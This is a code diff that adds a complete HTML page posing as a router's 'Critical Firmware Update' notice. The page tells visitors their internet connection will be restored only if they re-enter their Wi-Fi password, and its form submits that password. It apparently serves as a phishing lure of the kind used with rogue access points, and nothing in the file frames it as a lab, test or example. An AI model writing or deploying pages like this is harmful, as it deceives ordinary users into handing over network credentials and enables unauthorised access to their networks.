@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Router Firmware Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; text-align: center; margin-top: 50px; }
+        .box { background: white; max-width: 400px; margin: auto; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        h2 { color: #d32f2f; }
+        input[type="password"] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
+        button { background: #1976d2; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #1565c0; }
+        .msg { color: #555; font-size: 14px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Critical Firmware Update</h2>
+        <p class="msg">A mandatory firmware update has been installed on your router. To complete the setup and restore your internet connection, please re-authenticate with your Wi-Fi password.</p>
+        <form method="POST">
+            <input type="password" name="password" placeholder="Wi-Fi Password" required>
+            <br>
+            <button type="submit">Verify & Update</button>
+        </form>
+    </div>
+</body>
+</html>
